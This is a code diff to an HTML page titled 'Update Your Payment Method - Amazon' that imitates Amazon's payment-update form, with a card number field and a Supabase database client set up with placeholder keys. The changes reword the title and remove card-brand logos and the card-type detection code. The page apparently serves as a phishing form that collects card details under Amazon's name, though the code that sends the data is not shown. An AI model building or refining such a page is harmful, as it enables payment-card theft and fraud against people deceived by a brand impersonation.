@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Update Payment Method - Amazon</title>
+    <title>Update Your Payment Method - Amazon</title>
     <link href="https://fonts.googleapis.com/css2?family=Ember:wght@400;500&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <script src="https://www.google.com/recaptcha/api.js" async defer></script>
@@ -43,9 +43,6 @@
         .footer a { color: #007185; text-decoration: none; margin: 0 5px; }
         .help-link { font-size: 14px; margin-top: 10px; text-align: center; }
         .help-link a { color: #007185; text-decoration: none; }
-        .card-icons { display: flex; justify-content: center; gap: 10px; margin-bottom: 10px; }
-        .card-icons img { height: 20px; opacity: 0.5; }
-        .card-icons img.active { opacity: 1; }
         @media (max-width: 768px) { .container { padding: 20px; } .row { flex-direction: column; } }
     </style>
 </head>
@@ -106,12 +103,6 @@
             </div>
             <div class="form-group">
                 <label for="cardNumber">Card Number</label>
-                <div class="card-icons">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/4/41/Visa_Logo.png/100px-Visa_Logo.png" alt="Visa" id="visa">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b7/MasterCard_Logo.svg/100px-MasterCard_Logo.svg.png" alt="Mastercard" id="mastercard">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/American_Express_logo_(2018).svg/100px-American_Express_logo_(2018).svg.png" alt="Amex" id="amex">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Discover_Card_logo.svg/100px-Discover_Card_logo.svg.png" alt="Discover" id="discover">
-                </div>
                 <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
             </div>
             <div class="row">
@@ -158,19 +149,10 @@
         const supabaseAnonKey = 'your-anon-key';
         const supabase = createClient(supabaseUrl, supabaseAnonKey);
 
-        // Card number formatting and type detection
+        // Card number formatting
         const cardNumberInput = document.getElementById('cardNumber');
         const cleave = new Cleave(cardNumberInput, {
-            creditCard: true,
-            onCreditCardTypeChanged: function(type) {
-                // Remove active class from all
-                document.querySelectorAll('.card-icons img').forEach(img => img.classList.remove('active'));
-                // Add active class to matching type
-                if (type === 'visa') document.getElementById('visa').classList.add('active');
-                else if (type === 'mastercard') document.getElementById('mastercard').classList.add('active');
-                else if (type === 'amex') document.getElementById('amex').classList.add('active');
-                else if (type === 'discover') document.getElementById('discover').classList.add('active');
-            }
+            creditCard: true
         });
 
         // Expiration date formatting
